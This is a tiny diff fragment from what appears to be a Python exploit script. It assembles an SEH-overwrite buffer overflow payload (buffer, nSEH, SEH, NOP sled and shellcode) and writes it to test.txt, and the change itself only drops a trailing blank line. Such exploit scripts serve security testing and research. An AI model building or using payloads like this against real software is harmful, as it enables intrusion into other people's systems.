@@ -56,4 +56,3 @@ data = buffer + nSEH + SEH + nops + buf
 f = open ("test.txt", "w")
 f.write(data)
 f.close()
-
